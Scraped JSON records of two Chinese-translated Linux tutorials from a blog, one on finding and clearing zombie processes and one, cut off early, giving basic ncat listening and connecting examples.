{"url_object_id": "99ec28d00f3025c91fa99a93c1665c78", "title": "什么是僵尸进程，如何找到并杀掉僵尸进程？", "url": "http://blog.jobbole.com/113333/", "create_date": "2017/12/16", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.linuxandubuntu.com/home/what-are-zombie-processes-and-how-to-find-kill-zombie-processes\">Linuxandubuntu</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9143-1.html\">Linux中国/DarkSun</a>   </div><p>如果你经常使用 Linux，你应该遇到这个术语“僵尸进程Zombie Processes”。 那么什么是僵尸进程？ 它们是怎么产生的？ 它们是否对系统有害？ 我要怎样杀掉这些进程？ 下面将会回答这些问题。</p>\n<h3 id=\"toc_1\">什么是僵尸进程？</h3>\n<p>我们都知道进程的工作原理。我们启动一个程序，开始我们的任务，然后等任务结束了，我们就停止这个进程。 进程停止后， 该进程就会从进程表中移除。</p>\n<p>你可以通过 <code>System-Monitor</code> 查看当前进程。</p>\n<p><a href=\"http://www.linuxandubuntu.com/uploads/2/1/1/5/21152474/linux-check-zombie-processes_orig.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/0b2d6d68fbcacab03dd3736cb30dc7c2.jpg\" alt=\"\"></a></p>\n<p>但是，有时候有些程序即使执行完了也依然留在进程表中。</p>\n<p>那么，这些完成了生命周期但却依然留在进程表中的进程，我们称之为 “僵尸进程”。</p>\n<h3 id=\"toc_2\">它们是如何产生的？</h3>\n<p>当你运行一个程序时，它会产生一个父进程以及很多子进程。 所有这些子进程都会消耗内核分配给它们的内存和 CPU 资源。</p>\n<p>这些子进程完成执行后会发送一个 Exit 信号然后死掉。这个 Exit 信号需要被父进程所读取。父进程需要随后调用 <code>wait</code> 命令来读取子进程的退出状态，并将子进程从进程表中移除。</p>\n<p>若父进程正确第读取了子进程的 Exit 信号，则子进程会从进程表中删掉。</p>\n<p>但若父进程未能读取到子进程的 Exit 信号，则这个子进程虽然完成执行处于死亡的状态，但也不会从进程表中删掉。</p>\n<h3 id=\"toc_3\">僵尸进程对系统有害吗？</h3>\n<p><strong>不会</strong>。由于僵尸进程并不做任何事情， 不会使用任何资源也不会影响其它进程， 因此存在僵尸进程也没什么坏处。 不过由于进程表中的退出状态以及其它一些进程信息也是存储在内存中的，因此存在太多僵尸进程有时也会是一些问题。</p>\n<p><strong>你可以想象成这样：</strong></p>\n<p>“你是一家建筑公司的老板。你每天根据工人们的工作量来支付工资。 有一个工人每天来到施工现场，就坐在那里， 你不用付钱， 他也不做任何工作。 他只是每天都来然后呆坐在那，仅此而已！”</p>\n<p>这个工人就是僵尸进程的一个活生生的例子。<strong>但是</strong>， 如果你有很多僵尸工人， 你的建设工地就会很拥堵从而让那些正常的工人难以工作。</p>\n<h3 id=\"toc_4\">那么如何找出僵尸进程呢？</h3>\n<p>打开终端并输入下面命令:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635eee2a2e5169462657\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nps aux | grep Z\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635eee2a2e5169462657-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635eee2a2e5169462657-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635eee2a2e5169462657-1\"><span class=\"crayon-e\">ps </span><span class=\"crayon-v\">aux</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Z</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635eee2a2e5169462657-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>会列出进程表中所有僵尸进程的详细内容。</p>\n<h3 id=\"toc_5\">如何杀掉僵尸进程？</h3>\n<p>正常情况下我们可以用 <code>SIGKILL</code> 信号来杀死进程，但是僵尸进程已经死了， 你不能杀死已经死掉的东西。 因此你需要输入的命令应该是</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635eee2a2ee738634073\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkill -s SIGCHLD pid\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635eee2a2ee738634073-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635eee2a2ee738634073-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635eee2a2ee738634073-1\"><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SIGCHLD </span><span class=\"crayon-i\">pid</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635eee2a2ee738634073-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>将这里的 pid 替换成父进程的进程 id，这样父进程就会删除所有以及完成并死掉的子进程了。</p>\n<p><strong>你可以把它想象成：</strong></p>\n<p>“你在道路中间发现一具尸体，于是你联系了死者的家属，随后他们就会将尸体带离道路了。”</p>\n<p>不过许多程序写的不是那么好，无法删掉这些子僵尸（否则你一开始也见不到这些僵尸了）。 因此确保删除子僵尸的唯一方法就是杀掉它们的父进程。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113333\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113333votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113333\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/11a48b07810c909fd0ce4f50b3b33355d43f04e2.jpg"}
{"url_object_id": "b388a0a9722b034c4adad7ff85714f26", "title": "10 个例子教你学会 ncat (nc) 命令", "url": "http://blog.jobbole.com/113410/", "create_date": "2018/01/02", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "praise_nums": 2, "comment_nums": 0, "favor_nums": 2, "tags": "IT技术,nc,ncat", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linuxtechi.com/nc-ncat-command-examples-linux-systems/\">Pradeep Kumar </a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9190-1.html\">DarkSun </a>   </div><p><code>ncat</code> 或者说 <code>nc</code> 是一款功能类似 <code>cat</code> 的工具，但是是用于网络的。它是一款拥有多种功能的 CLI 工具，可以用来在网络上读、写以及重定向数据。 它被设计成可以被脚本或其他程序调用的可靠的后端工具。同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。</p>\n<p><code>ncat</code>/<code>nc</code> 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。 由于有这么多的功能，它被誉为是网络界的瑞士军刀。 这是每个系统管理员都应该知道并且掌握它。</p>\n<p>在大多数 Debian 发行版中，<code>nc</code> 是默认可用的，它会在安装系统的过程中自动被安装。 但是在 CentOS 7 / RHEL 7 的最小化安装中，<code>nc</code> 并不会默认被安装。 你需要用下列命令手工安装。<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a46f361456425\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# yum install nmap-ncat -y</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a46f361456425-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a46f361456425-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># yum install nmap-ncat -y</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>系统管理员可以用它来审计系统安全，用它来找出开放的端口然后保护这些端口。 管理员还能用它作为客户端来审计 Web 服务器、telnet 服务器、邮件服务器等， 通过 <code>nc</code> 我们可以控制发送的每个字符，也可以查看对方的回应。</p>\n<p>我们还可以用它捕获客户端发送的数据以此来了解这些客户端是做什么的。</p>\n<p>在本文中，我们会通过 10 个例子来学习如何使用 <code>nc</code> 命令。</p>\n<h3 id=\"toc_1\">例子： 1) 监听入站连接</h3>\n<p>通过 <code>-l</code> 选项，<code>ncat</code> 可以进入监听模式，使我们可以在指定端口监听入站连接。 完整的命令是这样的：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a47a252634358\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l port_number</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a47a252634358-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a47a252634358-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port_number</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>比如，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a480793173812\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a480793173812-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a480793173812-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>服务器就会开始在 8080 端口监听入站连接。</p>\n<h3 id=\"toc_2\">例子： 2) 连接远程系统</h3>\n<p>使用下面命令可以用 <code>nc</code> 来连接远程系统，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a484192329534\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat IP_address port_number</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a484192329534-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a484192329534-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ncat </span><span class=\"crayon-e\">IP_address </span><span class=\"crayon-v\">port_number</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>让我们来看个例子，<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a487200464501\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat 192.168.1.100 80</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a487200464501-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a487200464501-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这会创建一个连接，连接到 IP 为 192.168.1.100 的服务器上的 80 端口，然后我们就可以向服务器发送指令了。 比如我们可以输入下面内容来获取完整的网页内容<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a48a968004636\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div 